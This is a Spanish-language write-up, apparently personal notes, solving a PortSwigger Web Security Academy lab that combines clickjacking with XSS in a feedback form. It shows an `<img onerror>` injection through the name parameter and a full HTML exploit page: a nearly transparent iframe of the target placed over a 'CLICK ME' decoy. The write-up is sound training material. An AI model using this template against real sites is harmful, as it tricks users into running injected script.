
## Objetivo:

![[Pasted image 20240609212037.png]]


## Solucion:

Vemos un formulario para enviar un "feedback" intentaremos llenar dicho formulario usando la url con parametros y vemos que si se pudo...

![[Pasted image 20240609212408.png]]


Ahora intentaremos averiguar cual de los siguientes campos es vulnerable a XSS... Primero enviaremos el feedback con el boton de "Submit feedback".

Curiosamente el mensaje que se muestra abajo es el mismo del name.

![[Pasted image 20240609212533.png]]


Ahora intentaremos meter un HTML para ver si por alguna razón lo muestra en crudo asi tal cual con todo y etiquetas o lo procesa...

![[Pasted image 20240609212719.png]]

Como pudimos ver lo proceso, ahora tenemos que meter algun script o algo para que esto ejecute un "print()" con un solo click de la victima...

Probaremos  con `<script>print();</script>` y vemos que si se inyecta pero no pasa nada...

![[Pasted image 20240609212942.png]]


Lo que haremos es inyectar un disparador para ejecutar dicho script al mismo tiempo, solamente que le usuario haga click en "Submit Feedback" aumaticamente se dispare el script... Para esto podemos usar `<img src='x' onerror='print()' />`


![[Pasted image 20240609213118.png]]

Y vemos que si funciona

![[Pasted image 20240609213135.png]]

Ok, ya tenemos nuestro "exploit" ahora quedaria armado de la siguiente manera

```
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Document</title>

  

<style>

iframe {

width: 1000px;

height: 900px;

z-index: 2;

position: relative;

opacity: 0.3;

}

  

div {

position: absolute;

z-index: 1;

top: 810px;

left: 50px;

}

  

</style>

</head>

<body>

<div>CLICK ME</div>

<iframe src="https://0aff001e04fdefdb805b30df0074009e.web-security-academy.net/feedback?email=pwned@mail.com&name=%3Cimg%20src=%27x%27%20onerror=%27print()%27%20/%3E&subject=pwneado&message=prueba"></iframe>

</body>

</html>
```

![[Pasted image 20240609213456.png]]


Y mas de lo mismo cambiar el opacity del iframe a 0.000001, guardar y enviar al a victima...


![[Pasted image 20240609213623.png]]

